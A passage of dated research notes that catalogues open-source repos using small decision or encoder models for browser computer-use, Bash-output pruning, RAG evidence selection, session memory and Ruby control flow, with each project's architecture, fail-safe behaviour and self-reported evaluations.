### MED (brief)

- **[`Victor-Casado/if-ai`](https://github.com/Victor-Casado/if-ai)**
  (MIT; created 2026-09-18T22:09:14Z; 0★). Plain-English PR checks:
  one condition, a required `min-confidence`, one GitHub Action.
  Modes `pr-body` / `diff` / `per-file`. Pass only when true **and**
  confidence ≥ threshold. Empty body/diff, timeout, API error →
  **fail** (fail-closed on the Action). Two-option Choice (Noul has
  no native confidence). PR text is data, not a security boundary.
  Cousin of Abide / jev-pref / jev-marshal. Do not copy the Action
  YAML.
- **[`alexsatch/omp-auto-mode`](https://github.com/alexsatch/omp-auto-mode)**
  (MIT; created 2026-09-18T22:05:41Z; 0★). oh-my-pi plugin. README
  is one line: classify tool calls `safe` / `unsafe` / `ask`.
  Pre-action gate cousin. Description-thin.
- **[`jolehuit/jev-downloads-sorter`](https://github.com/jolehuit/jev-downloads-sorter)**
  (MIT; created 2026-09-18T22:25:30Z; 0★). Device-loop Choice:
  launchd `WatchPaths` on `~/Downloads`; one decision per file;
  ~400 ms README examples. Closed folder catalog; never invents
  folders; never overwrites; OpenRouter unreachable → extension-map
  fallback. Do not copy `install.sh`.
- **[`LakshyaChaudhry/jev-label-desk`](https://github.com/LakshyaChaudhry/jev-label-desk)**
  (created 2026-09-18T22:49:49Z; 0★). Description: weekend project
  using Jev to automate trace/data labeling for a provided taxonomy.
  README empty this pass. **Watch / description-only.**
- **[`flaviomartil/herdr-jev`](https://github.com/flaviomartil/herdr-jev)**
  (created 2026-09-18T22:23:53Z; 0★; license not stated this pass).
  Jev triage ~260 ms + triad orchestration (advisor / implementer /
  reviewer). No key → local heuristic, 0 ms. Do not copy
  `install.sh` or the model matrix.
- **jev-gateway siblings.** Product
  [`vinilana/jev-gateway`](https://github.com/vinilana/jev-gateway)
  (fail-open passthrough) + bench above. Claude Code is `hint` mode
  (cannot force `tool_choice` with thinking / cache). Do not copy
  ports.

### Omni / Jev-omni

Not multimodal. Usage: merge-gate / wake / claim-evidence as
text-state decisions **before** a generative turn. Archive +
landscape pointer. Archer still Watch.

## 52. GLiNER2 Ultrafast — encoder backend of observe→score-among-candidates→code-acts (2026-09-18 ~16:56 Boise)

America/Boise ~16:56 = 22:56 UTC. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR. Archer
27B drop still **WATCH**. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No wrapper, no `uv` / `.env` / Browser Harness
doctor how-to, no copied ports or Hub download scripts. No invented
metrics. **Not Jev. Not GLiNER2.5. Not multimodal.** Do not re-fold
§48 solari-reflex as a new product, §50 compaction as a species
rewrite, §51 CI merge-gate / wake / Harbor on/off, GLiGuard as a
safety clone, or jev-ultrafast's 7.1 s Flights
row as this demo.

Backend-agnostic: this is an **observe → score among observed
candidates → code acts** placement (pointer/selection among a11y/DOM
controls; hybrid local decide + remote fill; `DONE` is loop
termination, not verified success). TypeSafe Jev is one backend for
that *job* (`browser-use/jev-ultrafast`, `hitakshiA/solari-reflex`);
local Fastino GLiNER2 is another. Same instinct as §50 compaction
(Jev Noul/Score vs GLiNER2.5 encoder): Augustus stays family-first.

### HIGH

1. **[`sahibzada-allahyar/gliner2-ultrafast`](https://github.com/sahibzada-allahyar/gliner2-ultrafast)**
   (MIT; Python; created 2026-09-18T19:35:23Z; 12★ at capture). Fork /
   adaptation of [`browser-use/jev-ultrafast`](https://github.com/browser-use/jev-ultrafast)
   that swaps TypeSafe Jev for **local Fastino GLiNER2**
   ([`fastino/gliner2-multi-v1`](https://huggingface.co/fastino/gliner2-multi-v1);
   Apache-2.0 weights, 307M extractor, GLiNER2 not GLiNER2.5). Real
   browser automation. **Work in progress.** **Not a prose planner.
   Not a screenshot VLM. Not a hosted decision-model API.**

   Load-bearing loop (README + `docs/architecture.md`):

   ```text
   goal → local GLiNER2 → requirements
   page → observed controls → local matching + controller → browser action
                            → text helper (API) if typing needed
   ```

   GLiNER extracts requirement spans and **scores observed controls**.
   Candidates come from DOM / accessible labels (`snapshot.js`); the
   model chooses among them. It does **not** use screenshots. It does
   **not** generate selectors or executable JavaScript. Code owns
   requirement order, progress, calendar matching (English month
   names, ISO, US-style numeric), form submit, freshness / visibility
   / disabled / occlusion checks, and execution. Browser mutations
   are not automatically retried after uncertain execution. The
   inspector's scores are **not calibrated probabilities of task
   success**.

   Default hybrid, not fully offline: local GLiNER2 for decide;
   Mercury 2.5 via OpenRouter for typed field text (OpenAI-compatible
   endpoint configurable). Websites and the text-model service need
   the network. The browser uses an owned tab in an existing Chrome
   profile.

   **`DONE` ≠ verified success.** Termination is heuristic. Loop
   `DONE` reports that the agent stopped; applications must
   independently inspect the actual result. Example verifiers run
   *after* the loop and do not choose actions. Same Harbor-style
   honesty as solari-reflex (`notes.md` §48).

   **Demo claims (theirs; not re-run; not a bake-off).** Live Google
   Flights, one-way NYC→SFO on 9 Oct 2026; no ticket selected or
   purchased. README / `docs/demo.md`: **12.20 s** to visible results
   (12.201 s frame); complete action loop **13.785 s**; API usage
   **~$0.0001** ($0.00010623 across three text-helper calls). Clock
   starts after model loading, goal parsing, initial navigation, and
   first page observation. Independent outcome verification is
   *outside* that clock. Local compute and electricity excluded.
   Their measurement doc: a demonstration, not a controlled
   performance comparison or general reliability benchmark. Do not
   invent a vs-Jev-Ultrafast table; do not merge with the atlas
   7.1 s / 9.5 s Flights figures (`notes.md` §49).

   **Four load-bearing mental models (architecture, not a plugin
   catalog):**

   1. **Same job, encoder backend.** Jev Ultrafast scores among
      observed controls with TypeSafe Jev; this repo scores among
      observed controls with local GLiNER2. The *hole* is
      observe → score-among-candidates → code acts. Compaction
      (`notes.md` §50) already taught that keep/drop is
      backend-agnostic (Jev Noul/Score vs GLiNER2.5). Computer-use
      selection is the same lesson on a different hole. Augustus
      does not pick a vendor for the hole.

   2. **Candidates from observation, not generation; not
      screenshot multimodal.** Control set is a11y/DOM-derived.
      Pointer/selection species with
      [solari-reflex](https://github.com/hitakshiA/solari-reflex)
      (structured obs, Jev, no screenshots; `notes.md` §48) and
      [laya-mind2web-browser-agent](https://huggingface.co/ShaunSpark/laya-mind2web-browser-agent)
      (Laya open head; operation + target index over a list of
      interactive DOM elements; author-reported 74.3% on 68
      held-out — small n, not a ranking; Apache-2.0). Contrast
      [blackwood-rlcd](https://huggingface.co/BlackwoodAI/blackwood-rlcd)
      (screenshot + letters code already marked → Choice; CC BY-NC;
      `notes.md` §46). Pixel-free / DOM-as-text is the preferred
      computer-use placement when the environment is already
      structured (`judgment-class.md` vision pattern 1;
      `mental-models.md` §boundary).

   3. **Hybrid local decide + remote fill.** Economics: tiny API
      for TYPE text; local encoder for control scoring. Mixed
      architecture, not dual-process-ai (that product is S1/S2 with
      a confidence τ; routing accuracy unmeasured — `notes.md`
      §49). Here the *split* is where compute lives: judgment on
      the laptop, generation only where a string must be typed.
      Code still owns actuators. A loop with nothing to type stays
      local.

   4. **Composition + independent outcome check.** Perception
      (Browser Harness / DOM snapshot) → decision (GLiNER2) →
      verified act (code). The post-run verifier is not the
      decision policy. Same Harbor instinct as solari / jev-e2e:
      score the *task*, not a self-report.

   **Limits (theirs, README + architecture; experimental).** Common
   HTML and ARIA patterns; behavior varies with page structure and
   goal wording. Date parsing is English-oriented. Not fully
   offline. Optional traces can include page content. No published
   Harbor taskset or calibration of control scores as P(success) —
   do not invent them.

   **Siblings — complementary, do not merge.**

   - **`browser-use/jev-ultrafast`:** same job, Jev backend. Credit
     in their README. Do not treat this demo clock as a head-to-head.
   - **`hitakshiA/solari-reflex`:** same observe → decide → verified
     act; Jev; Harbor-style table vs Codex on Solari (`notes.md` §48).
   - **`m-newhauser/gliner25-compaction`:** Fastino encoder sibling
     *class*, GLiNER2.5 (`fastino/gliner2.5-base-v1`), compaction /
     keep-drop hole — not this checkpoint and not browser CU
     (`notes.md` §50).
   - **GLiGuard:** Fastino encoder sibling (safety-schema classify).
     Not control scoring.
   - **blackwood-rlcd:** screenshot multimodal decide. Different
     input. Not this placement.
   - **`24601/rh-guard`:** light note only — independent outcome
     verification vs trusting `DONE`. Not reward-hack detection.

   **Placement.** Exact-text keep/drop among observed controls
   (`applied-mappings.md` §2) + mixed architecture (code acts; LLM
   writes TYPE only). Pillar: search/control (one substituted
   classifier step) + runtime-assurance sandwich (freshness /
   visibility / no generated selectors in code). Hole: perceive /
   keep-drop / replace-one-classifier-step. Family: GLi\* encoder
   (GLiNER2 local, `gliner2-multi-v1`). Fail-closed on actuation
   (code validates the observed node). Eval path: their Flights
   demonstration + post-run verifier; no class bake-off this pass.
   **Empirical** as README / architecture behavior. **Hypothesis**
   that the same envelope transfers to *your* sites. Cards:
   `judgment-class.md` (primary); `mixed-architecture.md` (primary);
   `applied-mappings.md` §2; `mappings.md` §9 / §12; `faq.md`;
   `mental-models.md`; `validation.md`; `methods-catalog.md`;
   `toolbox-mapping.md`; `agent-self-assessment.md`. No wrapper.

### Omni / Jev-omni

Not multimodal pixels. Strong **composition / open-weights decide**
exemplar for browser computer-use (local encoder + remote fill).
Archive + landscape. Harbor-style independent verify is already in
their framing.

## 53. jev-pruner — evidence-preserving Bash stdout prune (2026-09-18 ~17:15 Boise)

America/Boise ~17:15 = 23:15 UTC. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR. Archer
27B drop still **WATCH**. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No wrapper, no marketplace / Codex install
how-to, no copied `keepThreshold` as a class constant. No invented
metrics. **Not a summarizer. Not session compaction. Not GLiNER.**
Do not re-fold §50 gliner25-compaction as this product, §52
observe→score-act, §48 jevprune/winnow as a new species, or
fast-jev-compaction as a duplicate.

Family: **evidence-preserving reduce** (pointer/extractive, dropped
bytes recoverable). Same instinct as
[`tamaratran/fast-jev-compaction`](https://github.com/tamaratran/fast-jev-compaction)
and [`m-newhauser/gliner25-compaction`](https://github.com/m-newhauser/gliner25-compaction)
(`notes.md` §50). **Different job:** prune a just-run Bash result
*before* the main LLM sees it, not compact completed tool pairs
already in session history. **Different backend vs GLiNER2.5:**
TypeSafe Jev Noul, not an encoder retention Choice. Same author as
fast-jev-compaction; the READMEs say the two are independent and can
be installed together. Marketplace / Claude plugin id is still
`fast-jev-output` — name ≠ id.

### HIGH

1. **[`tamaratran/jev-pruner`](https://github.com/tamaratran/jev-pruner)**
   (MIT; TypeScript; created 2026-09-18T03:00:58Z; 5★ at attached
   capture, 7★ live this pass). Claude Code plugin: after Bash runs,
   **before** the result is sent back to the main LLM, Jev
   Noul-prunes stdout **without generating a summary**. Codex is an
   **opt-in wrapper/skill**, not automatic `PostToolUse`
   interception — the host cannot replace native shell output that
   way. **Work in progress / measurement-native.** **Not a prose
   compressor. Not a screenshot VLM. Not a GLiNER backend.**

   Load-bearing loop (README):

   ```text
   Claude requests Bash → command runs → Jev prunes stdout → Claude receives result
                          (+ archive path for dropped spans)
   ```

   One Noul per chunk: “does any line in this chunk need to remain
   available?” A single needed line protects the chunk. Chunks of
   `chunkLines` lines (default 20), capped at 200 chunks. Categories
   (build/test, search/excerpt) add guidance only — they never mark
   a whole command disposable or change the keep threshold.

   **Four load-bearing mental models (architecture, not a plugin
   catalog):**

   1. **Evidence-preserving prune, not summarize.** Same extractive
      honesty as gliner25-compaction / jev-reviewer / testimonial-miner:
      the model **selects**; code **keeps verbatim chunks**. Dropped
      text is archived under `.claude/fast-jev-output/` (Claude) or
      `.jev-pruner/` (Codex) *before* the first scoring request;
      markers point at the recovery path. A generator summary of
      stdout is a different species. Credential-like commands/output
      are **not** archived; markers tell the agent to re-run. That
      check only skips local archive — it does **not** redact
      secrets from Jev (`notes.md` this section).

   2. **Hard envelope, then soft Noul.** Code proves pass-through
      *before* Jev runs: ≤10,000 estimated tokens (`estimateTokens`
      on raw stdout; `minTokens` can raise this, not lower it);
      errors; JSON/XML/YAML/diff/binary; whole-document commands
      (`cat`, `jq`, `git diff`, `git show`, `base64`, `openssl`).
      Format detection beats a build/search category. Jev only
      scores the residual noisy log. Same sandwich as
      bitrate-advisor / jevgate / gliner25 mutation monitor
      (`mappings.md` §12 / §18): structure first, remainder judged.

   3. **Fail-safe keep original.** Archive write failure, Jev
      failure, unfit state, incomplete scoring against every history
      segment, first/last chunks, error/warning patterns → original
      stdout untouched. The *reduction* is the irreversible act, so
      uncertainty fails closed to keep-full — same polarity as
      gliner25 `keep_full`, opposite slogan from Abide / jevgate
      fail-open. Plugin-eval receipt of that envelope: Harbor's
      `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC` refuses the Jev
      fetch, the hook falls back to original output, and the suite
      **cannot exercise pruning** (evals README). That is the
      fail-safe working, not a missing metric.

   4. **Host capability shapes the product.** Claude: automatic
      `tool.call` wrap of Bash `next()`. Codex CLI 0.152.1 cannot
      replace native shell output from `PostToolUse`, so the product
      is a wrapper + skill. Same judgment engine; different
      insertion. Do not copy the wrapper.

   **Eval (theirs, not re-run; 2026-09-18).** Manual `trimOutput`
   sweep, 3 runs/scenario, `jev-latest`: needles kept **24/24**;
   mean reduction **83% (71–92%)** on scenarios meant to trim;
   wrongly trimmed **0/12** pass-through; mean latency **240 ms**.
   Wider sweeps: standard 8/8 / 83%; accuracy 36/36 / 87%; real
   captures 10/10 / 54% (three correctly left whole); needle matrix
   9/9. README demonstration: a 76,379-char log whose 2,227-char
   preview missed the error line became 4,013 chars of pruned
   output that kept it — illustration, not a bake-off. Harbor
   Terminal-Bench 2.0 adapter + six-run paired pilot is
   **integration, not a full benchmark or significance test** (full
   set is 89 tasks / 178 trials; no published full-run scores this
   pass). Plugin `claude plugin eval` cases predate the 10k gate
   and cannot reach Jev. Do not merge those tables. `keepThreshold`
   default 0.5 is **their** knob.

   **Siblings — complementary, do not merge.**

   - **`tamaratran/fast-jev-compaction`:** same author; session
     compaction of completed tool pairs (two Nouls). Different job.
   - **`m-newhauser/gliner25-compaction`:** same evidence-preserving
     *family*; GLiNER2.5 encoder backend; session compaction;
     `shadowMode` default true (`notes.md` §50).
   - **`ibrahemid/jevprune` / winnow:** per-line / per-block
     relevance before context. Same *sieve* hole; this product adds
     the 10k/format envelope + archive + Harbor harness.
   - **`24601/rh-guard`:** light note only (fail-safe / envelope).
     Not reward-hack detection.

   **Placement.** Context sieve + exact-text keep/drop
   (`applied-mappings.md` §1–§2) + mixed architecture (code owns
   envelope and archive; Jev scores residual chunks; LLM never
   writes the kept bytes). Pillar: selective classification / SDT
   (false drop >> false keep) + runtime-assurance sandwich. Hole:
   sieve / keep-drop. Family: TypeSafe Jev (Noul). Fail-closed on
   the reduction. Eval path: their manual sweep + in-repo Harbor
   adapter (pilot ≠ full bench). **Empirical** as README / evals
   README behavior. **Hypothesis** that the envelope transfers to
   *your* command mix. Cards: `applied-mappings.md` §1 (primary);
   `mixed-architecture.md`; `mappings.md` §12 / §18; `faq.md`;
   `validation.md`; `judgment-class.md`; `mental-models.md`;
   `methods-catalog.md`; `toolbox-mapping.md`;
   `agent-self-assessment.md`. No wrapper.

### Omni / Jev-omni

Not multimodal. Usage: command-output sieve as a perception/memory
hygiene stage **before** the generative turn. Harbor-adjacent
eval harness in-repo. Archive + landscape pointer.

## 54. Cua-S1 — specialist System One computer-use (form-v0 profile, source-only) (2026-09-18 ~17:21 Boise)

America/Boise ~17:21 = 23:21 UTC. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR. Archer
27B drop still **WATCH**. Identity lock vs `typesafe-ai` / `tenbin` /
`decision-first` holds. No wrapper, no `uv` / MCP / Driver how-to, no
copied factory env vars. No invented metrics. **Not TypeSafe Jev.
Not GLiNER. Not a general CUA. Not multimodal pixels-in. Source-only
— no weights, no checkpoint scores.** Do not re-fold §52
gliner2-ultrafast as this product, §48 solari-reflex, §53
jev-pruner, blackwood-rlcd as a screenshot cousin, or laya-mind2web
as a Laya DOM-index cousin.

Family: **observe → score-among-candidates → code acts** (selection
head over observed elements; code owns execution order). Same hole
as jev-ultrafast / solari-reflex (Jev), gliner2-ultrafast (GLiNER2),
laya-mind2web (Laya). **Different naming:** CUA's "System One" is a
parallel research label, not a TypeSafe Jev contract. **Different
scope:** specialist form-oriented checkpoint profile
(`cua-s1-form-v0`), not a general computer-use agent. Weights
**Watch**.

### HIGH

1. **[`trycua/cua` `libs/cua-s1`](https://github.com/trycua/cua/tree/main/libs/cua-s1)**
   (parent MIT; Python package `cua-s1` / `cua_s1`; ~23.3k★ parent
   this pass). Research project for **small, specialist computer-use
   models** with a defined task class. First checkpoint profile:
   `cua-s1-form-v0` (form-oriented UI). This component ships model,
   synth data, training, eval utilities, and optional Cua Driver +
   MCP server **source**. It does **not** include or download
   weights, datasets, demo binaries, or recordings. **No checkpoint
   performance claim.** Future official weights may use separate
   terms. **Not a TypeSafe Jev drop-in. Not a screenshot VLM. Not a
   generator of selectors or field values.**

   Load-bearing loop (README + MODEL_CARD):

   ```text
   snapshot / a11y elements + Label:value entities
        → tinyx byte encoder + option-attention
        → per element: fill | check | click | skip
        → code orders execution (plan ≠ execute; dry-run default)
   ```

   Reference `tinyx`: byte-level transformer encoder +
   **option-attention classification head**. Per observed interface
   element, one option from a **fixed set**: fill with an entity
   extracted from the source document, check, click, or skip. The
   prototype scores elements independently. Document parser only
   extracts `Label: value` pairs. **Code** turns selected options
   into an execution order. Fill values are **selected**, not
   generated.

   **Four load-bearing mental models (architecture, not a Driver
   how-to):**

   1. **Specialist S1 vs general agent.** Membership in the Cua-S1
      family does not imply general computer-use capability. A
      checkpoint has a narrow task contract and checkpoint-specific
      eval. Same philosophy as "Jev-class for a job," not omnimodal
      AGI. Do not treat `form-v0` as evidence outside its evaluated
      boundaries — and there is **no evaluated checkpoint** in this
      source-only drop.

   2. **Choice among observed elements / fixed actions.** Selection
      head, not a generator of selectors or values. Family with
      gliner2-ultrafast (score observed controls), solari-reflex
      (structured observe → typed act), jev-ultrafast, laya-mind2web
      (DOM indices). Contrast blackwood-rlcd (screenshot + marked
      letters). If the fill entity is not already a `Label: value`
      pair the parser holds, this card does not apply.

   3. **Plan ≠ execute; dry-run default; fail-closed.** Planning and
      execution are separate. Optional runtime defaults to dry run.
      One unambiguous target window; snapshot-bound element tokens;
      reobserve after each mutation. `execute` and `submit` are
      independent opt-ins. Submit is narrow: at most one
      high-confidence Button / AXButton whose normalized label is
      exactly `Submit` or `Submit Form`. Fail-closed on missing
      checkbox role/checked state; already-checked boxes skipped;
      checked postcondition verified. PDF confined to allowed roots
      (cwd default; production should use a dedicated directory).
      Portable Cua Driver contract does not currently expose
      `set_value` — fill **execution** fails closed unless the
      connected runtime advertises token-based value mutation;
      planning remains available. Inspect the dry-run plan before
      enabling both execution flags.

   4. **Not TypeSafe Jev.** Parallel "System One" naming in
      computer-use research. No Choice/Score/Noul contract, no
      `/v1/systemone` drop-in. Augustus stays family-first: the
      *hole* is specialist decide among observed candidates under a
      hard envelope. Backend-agnostic judgment class still applies.

   **Eval honesty (theirs; no scores this pass).** Included tests
   exercise **implementation behavior, not checkpoint quality**.
   Offline utilities *report* abstention, coverage, selective
   accuracy, wrong actions, wrong targets, and unsafe actions when
   the expected behavior was to abstain. Synthetic splits are
   disjoint by form signature; model selection uses validation
   rather than test. A future checkpoint **must** report exact
   revisions, task set, environment, action space, independent
   outcome verification, and failure categories. Responsible-use
   text: do not treat model output or apparent task completion as
   proof the action was correct. **Watch** for a `cua-s1-form-v0`
   artifact drop. Do not invent metrics.

   **Siblings — complementary, do not merge.**

   - **gliner2-ultrafast / solari-reflex / jev-ultrafast /
     laya-mind2web:** same observe→act *job*; Jev, GLiNER2, or Laya
     backends with shipped loops. This is a source-only specialist
     head.
   - **blackwood-rlcd:** screenshot multimodal decide. Different
     input.
   - **`24601/rh-guard`:** light note only (dry-run / submit opt-in /
     fail-closed state checks). Not reward-hack detection.

   **Placement.** Exact-text keep/drop among observed elements
   (`applied-mappings.md` §2) + mixed architecture (code owns
   envelope, dry-run, submit gate; model selects among candidates).
   Pillar: search/control (one substituted classifier step) +
   runtime-assurance sandwich (plan≠execute, fail-closed checkbox /
   fill). Hole: perceive / keep-drop / replace-one-classifier-step.
   Family: specialist encoder decide head (`tinyx` option-attention)
   — **not** TypeSafe Jev, **not** GLiNER. Fail-closed on actuation.
   Eval path: none published (source-only); metric *names* are
   specified. **Empirical** as README / MODEL_CARD behavior.
   **Hypothesis** that a future `form-v0` checkpoint fills the
   profile. Cards: `judgment-class.md` (primary);
   `mixed-architecture.md` (primary); `applied-mappings.md` §2;
   `mappings.md` §9 / §12; `faq.md`; `mental-models.md`;
   `validation.md`; `methods-catalog.md`; `toolbox-mapping.md`;
   `agent-self-assessment.md`. No wrapper.

### Omni / Jev-omni

Not multimodal pixels. Strong **computer-use composition** signal:
perception (a11y/snapshots) → specialist decide → verified act.
Form specialist, not pixels-in. Weights TBD — Watch for
`cua-s1-form-v0`. Archive + landscape pointer.

## 55. CUDA replica, decision-native RAG, verbatim recall, Ruby primitive, FHIR Harbor, AMBIGUOUS baselines (2026-09-18 ~17:48 Boise)

America/Boise ~17:48 = 23:48 UTC. Docs-only fold into open PR #2
(`cursor/augustus-store-envelope-00b4`). Not a competing PR. Archer
27B drop still **WATCH**. X MCP namespace flap continues; `since_id`
not advanced this pass. Attached archive path
`/workspace/jev-archive/2026-09-18/234740` is **not present locally** —
receipts are live GitHub/HF + the published report site. Identity lock
vs `typesafe-ai` / `tenbin` / `decision-first` holds. No wrapper, no
Windows CUDA/venv / gem / Rails / `uv` / `mcp add` / pip how-to, no
copied ports, thresholds as class constants, or invented metrics.

Do **not** re-fold §50 GLiNER2.5 compaction, §51 latch/wakegate/
s1-indexer/clear-head/foreman/jevons, §52 gliner2-ultrafast, §53
jev-pruner, or §54 Cua-S1. Do not rewrite the student-b *species*
(already §33 / applied-mappings §1 / judgment-class LoRA table).

Backend-agnostic: this hour is **local inference replica**,
**retrieve-wide → decide → evidence set**, **verbatim ledger +
scored recall**, **judgment as a language primitive**, **Harbor-
shaped healthcare measurement**, and **honest pre-registered
AMBIGUOUS eval** (cascade sign-flip; calibration theater). TypeSafe
Jev is the documented exemplar, not the monopoly. Augustus stays
family-first.

### HIGH

1. **[`Mintzs/jevify`](https://github.com/Mintzs/jevify)**
   (Python; created 2026-09-18T23:41:21Z; 0★ at capture; **no LICENSE
   file this pass — do not invent**). Experimental CUDA/PyTorch engine
   for parallel classification, yes/no, and rubric scoring with a
   shared context. Default model `Qwen/Qwen2.5-1.5B-Instruct`. Python
   package `ora_decision_engine`; CLI `ora-decision`. README: **this
   repository is independent of the Distillation project.** Default
   `workflow.json` is a four-question **refund rubric, not a validated
   policy**. Default `--answer-encoding letters`; `--answer-encoding
   labels` is the literal-label comparison path. Single-token answers
   keep selected-head scoring; explicit label encoding evaluates
   multi-token labels with a cached prompt and batched known
   continuations. **These are uncalibrated model likelihoods, not
   measured correctness probabilities.** Optimizations named in
   README: bounded CUDA graph replay, reused answer-head weights,
   optional Triton RMSNorm/SwiGLU/RoPE, short-branch kernel, grouped
   similar question lengths. Historical tensors live under ignored
   `outputs/`; fresh checkout skips those integration tests.

   **Four load-bearing mental models:**

   1. **Open local packed-logprob / CUDA replica class.** Same *job*
      as [`ikermoel/open-alternative-jev`](https://github.com/ikermoel/open-alternative-jev)
      (packed one-forward on an open LLM; not a Jev reproduction;
      `notes.md` §49): shared context, score allowed continuations,
      no generated prose. Family is constrained-AR / logprob surface,
      **not** trained decision-only (Laya / kev / Archer Watch) and
      **not** a teacher-copy LoRA (openjev-lm / student-b).
   2. **Uncalibrated likelihood ≠ Noul.** Softmax over A/B/C or
      `false`/`true` is not a proper-scoring head. Do not threshold
      it as P(permit) or as calibrated abstention. Temperature /
      ECE on *your* labels if you use it.
   3. **Default refund workflow is not a policy.** Configure
      questions separately from inputs; do not ship their example
      as production refund logic.
   4. **Do not copy the Windows CUDA/venv how-to.**

   **Placement.** Judgment-class constrained-AR / packed-logprob
   cousin (`judgment-class.md` when-to-use). Pillar: search/control
   (one substituted classifier step). Hole: replace-one-classifier-
   step / perceive. Family: constrained-AR surface on an open LLM.
   Fail polarity: **not established** — likelihoods are not
   decision scores. Eval path: historical tensors not in a fresh
   clone. **Empirical** as README behavior. **Hypothesis** that
   CUDA graphs / branch kernels transfer to *your* GPU. Cards:
   `judgment-class.md` (primary); `faq.md`; `mixed-architecture.md`.
   No wrapper.

2. **[`emergency-lee/decision-native-rag-skills`](https://github.com/emergency-lee/decision-native-rag-skills)**
   (MIT; HTML+skills; created 2026-09-18T23:29:20Z; 0★). Agent Skills
   for migrating, evaluating, and designing RAG around a
   **decision-native evidence pipeline** rather than fixed Top-K.
   Tagline: retrieve broadly → decide explicitly → build an evidence
   set → resolve conflicts → reason only over what matters.
   **Provider-agnostic.** Jev / OpenJev are cheap semantic operators,
   not a required SDK. Three skills: `rag-migrate` / `rag-evaluate` /
   `rag-design`. **No bundled Python harness** — generate the smallest
   fit-for-purpose harness inside the target project. Does **not**
   claim a universal benchmark. Falsifiable hypothesis: at comparable
   answer quality and safety, wide retrieval + explicit evidence
   decisions can improve evidence recall and cut irrelevant/redundant
   context vs fixed Top-K, inside an acceptable latency/cost envelope.
   Default migration *gates* (starting targets, not promises):
   required-evidence recall improve-or-hold; delivered precision
   improve-or-tolerance; redundancy and unresolved contradiction
   reduce; unsupported claims and provenance must not regress; p95
   and cost within SLO or explicit trade-off; live user/task success
   before full rollout. Eval stages: offline frozen replay → shadow
   → canary → A/B. A team should not ship because an offline LLM
   judge prefers it.

   **Four load-bearing mental models (core Augustus RAG):**

   1. **Embeddings stay candidate generators.** Similarity / rerank
      is not relevance, sufficiency, redundancy, conflict, time, or
      authority. Stop asking one Top-K cutoff to solve all six.
   2. **Retrieve wide → decide → evidence set → LLM.** Reason only
      over kept evidence. Generation is downstream of an explicit
      keep set. Same family as classifying-RAG-passages cookbook +
      mappings §4, promoted from "rerank the shortlist" to
      **evidence-set construction**.
   3. **Skills, not a measured harness.** No bundled Python, no
      private corpus, no universal number. The hypothesis is
      falsifiable on *your* system.
   4. **Do not copy skill files as a product.**

   **Placement.** Retrieval + bounded semantic reranking
   (`mappings.md` §4) + applied moderation/ranking
   (`applied-mappings.md` §4) + mixed architecture (code owns
   evidence-set / conflict / provenance; model scores candidates).
   Pillar: VOI (expand only if the evidence set is insufficient) +
   MCDA (relevance / freshness / authority as named features).
   Hole: rank / sieve / gather. Family: closed decision API *or*
   any cheap semantic operator (backend-agnostic). Fail-open on
   drop of a candidate (false drop loses evidence). Eval path:
   rag-evaluate four stages; **Hypothesis** until a target-system
   test runs. **Empirical** as README architecture. Cards:
   `mappings.md` §4 (primary); `applied-mappings.md` §4;
   `mixed-architecture.md`; `mental-models.md`; `faq.md`. No
   wrapper.

3. **[`Dharundp6/jev-carryforward`](https://github.com/Dharundp6/jev-carryforward)**
   (MIT; TypeScript; created 2026-09-18T23:04:58Z; 1★; npm
   `carryforward`). MCP session memory: `record` saves a fact
   verbatim the moment it happens; `recall` scores non-rule entries
   with Jev against the current task. **Nothing is summarised.
   Nothing is deleted.** Kinds: `constraint` / `correction` /
   `decision` / `measurement` / `thread`. Constraints and
   corrections **always return in full** — Jev never votes on a
   rule you set. Decisions / measurements / threads need a `ref`.
   Provenance: `measured` / `decided` / `told` / `inferred`.
   Thresholds (theirs, exported constants, not class constants):
   p ≥ 0.60 full entry; 0.30–0.60 one line; below omit from the
   brief (still on disk). Fail-open: no key / no task / scorer down
   / rate-limited → **whole list** plus a line saying why.
   Asker is swappable (`Asker.ask(state, questions)`). JSONL
   append-only at `~/.carryforward/<project>.jsonl`. Nine entries ×
   three tasks is a **hint, not proof**; no accuracy claim until a
   proper test. Tests use a fake scorer; never the network.

   **Four load-bearing mental models:**

   1. **Verbatim ledger, scored recall.** Pointer-not-generator on
      *memory*: the model never rewrites the note. Sorting happens
      at read, not write. Family with pi-jev-compaction /
      testimonial-miner (select, copy, do not summarize).
   2. **Rules never judged.** Constraints/corrections are always-
      keep in code. Same sandwich as jevgate's allowlist *proves*
      / remainder judged — here the remainder is "is this still
      live for the task?"
   3. **VOI / selective memory.** Pay for a scored brief iff it
      beats dumping the whole ledger (fail-open dump is the safe
      default). Horvitz: skip the irrelevant, never skip the rule.
   4. **Do not copy `claude mcp add` / SessionStart hooks.**

   **Placement.** Context sieve (`applied-mappings.md` §1) + VOI
   (`mappings.md` §6). Pillar: VOI + selective classification.
   Hole: sieve / gather. Family: closed decision API (Noul
   "still live?"). Fail-open on scoring failure. Eval path: none
   published (9×3 hint). **Empirical** as README behavior.
   **Hypothesis** that scored recall beats dump-or-summary on
   *your* session. Cards: `applied-mappings.md` §1 (primary);
   `mappings.md` §6; `mixed-architecture.md`;
   `agent-self-assessment.md`. No wrapper.

4. **[`carldaws/hunch`](https://github.com/carldaws/hunch)**
   (MIT; Ruby; created 2026-09-18T23:08:32Z; 0★). Probabilistic
   control flow for Ruby: `if` / `case` / `<=>` for facts; Hunch
   for judgment calls. English is the configuration. `chance` →
   Noul (`almost_certain?` / `likely?` / `probable?` / named
   levels); `pick` → Choice; `rate` → Score. Batch `Hunch.decide`
   over one `given:`. Rails examples (theirs): validations, inbound
   email routing, error triage, job retries, enum coercion,
   comment moderation. **`rescue nil` on validations is deliberate
   fail-open at save** — fail closed instead where it matters
   (spam gate). Stub backend for tests. Same interface ≠ same
   guarantees for a future LLM backend (Jev calibrated + typed +
   milliseconds; an LLM backend is estimates, slower, dearer).
   Cousin of [`southpolesteve/probably`](https://github.com/southpolesteve/probably)
   (language whose *loop conditions* are Jev feelings) — Hunch is
   a library in Ruby, not a new language.

   **Four load-bearing mental models:**

   1. **Judgment as a language primitive.** `almost_certain?` /
      `pick` / `rate` are control-flow, not a prompt. English-as-
